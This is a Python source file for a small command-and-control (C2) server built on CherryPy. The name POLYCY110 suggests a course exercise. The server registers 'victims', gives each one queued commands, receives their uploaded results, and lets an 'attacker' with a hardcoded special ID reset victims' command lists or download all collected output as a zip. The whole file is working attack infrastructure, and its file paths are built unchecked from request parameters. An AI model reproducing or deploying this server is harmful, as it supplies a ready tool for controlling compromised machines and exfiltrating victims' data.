import cherrypy
import os
from pathlib import Path
from zipfile import ZipFile
from datetime import datetime
from os.path import basename
from cherrypy.lib.static import serve_file


def zipAllOutput(filename):
    # create a ZipFile object
    with ZipFile(filename, 'w') as zipObj:
        # Iterate over all the files in directory
        for folderName, subfolders, filenames in os.walk(os.getcwd() + "/output"):
            for filename in filenames:
                # create complete filepath of file in directory
                filePath = os.path.join(folderName, filename)
                # Add file to zip
                zipObj.write(filePath, basename(filePath))


@cherrypy.expose
class RESTfulServicePOLYCY110(object):

    @cherrypy.tools.accept(media='text/plain')
    def GET(self, userID):
        if(userID == "257.257.257.257"):
            #Special userID for the 'bad guy'
            now = datetime.now()
            current_time = now.strftime("%y%m%d%H%M%S")
            filename = os.getcwd() + "/output-" + current_time + ".zip"
            zipAllOutput(filename)
            return serve_file(filename, "application/x-download", "attachment")

        with open(os.getcwd() + "/inputCommands/Commands-{}.txt".format(userID), "r") as f:
            strLines = f.readlines()

        if(len(strLines) != 0):
            print("User : " + userID + " is requesting a new command. Giving him :" + strLines[0] + "\n")
        else:
            print("User : " + userID + " Out of commands!! " + "\n")
            return "0"

        #Saving the files, skipping the first Line
        with open(os.getcwd() + "/inputCommands/Commands-{}.txt".format(userID), "w") as f:
            cpt = 0
            for line in strLines:
                if cpt == 0:
                    cpt += 1
                    continue
                f.write(line)
                cpt+= 1

        return strLines[0]


    @cherrypy.tools.accept(media='multipart/form-data')
    def POST(self, userID, commandID, time, file):
        size = 0
        Path(os.getcwd() + "/output/{}".format(userID)).mkdir(parents=True, exist_ok=True)
        with open(os.getcwd() + "/output/{}/{}-{}-{}.txt".format(userID, commandID, userID, time), "wb") as f:
            while True:
                data = file.file.read(8192)
                if not data:
                    break
                size += len(data)
                f.write(data)
        return "Thank you!"

    def PUT(self, userID, commandID):
        # Every PUT request is going to 'register' a new 'victim' and create and basic commands file
        # This will usually be associated with the IP of the victim, EXCEPT
        # Login with the special user "257.257.257.257" will be used by the 'attacker' to reset the commands vector
        # of another victim in commandID, the second parameter

        if(userID != "257.257.257.257"):
            commandID = userID

        #Special userID for the 'bad guy'
        #Hardcoded, he will just reset the commands file with a 'standard' set
        #Eventually, the special user could upload specialty craft command vector files for each victim.
        with open(os.getcwd() + "/inputCommands/Commands.txt", "r") as f:
            strLines = f.readlines()

        with open(os.getcwd() + "/inputCommands/Commands-{}.txt".format(commandID), "w") as f:
            for line in strLines:
                f.write(line)

        return "Thank you!"

    def DELETE(self):
        return ""


class AppServer:
    def __init__(self):
        pass

    def run(self):
        print("This C2 Server is starting")
        cherrypy.config.update({'server.socket_host': '0.0.0.0',
                                'server.socket_port': 8081,
                                'request.show_tracebacks': False
                                })
        conf = {
            '/': {
                'request.dispatch': cherrypy.dispatch.MethodDispatcher(),
                'tools.sessions.on': True,
                'tools.response_headers.on': True,
                'tools.response_headers.headers': [('Content-Type', 'text/plain')],
            }
        }
        cherrypy.quickstart(RESTfulServicePOLYCY110(), '/', conf)

    def __call__(self, *args, **kwargs):
        self.run()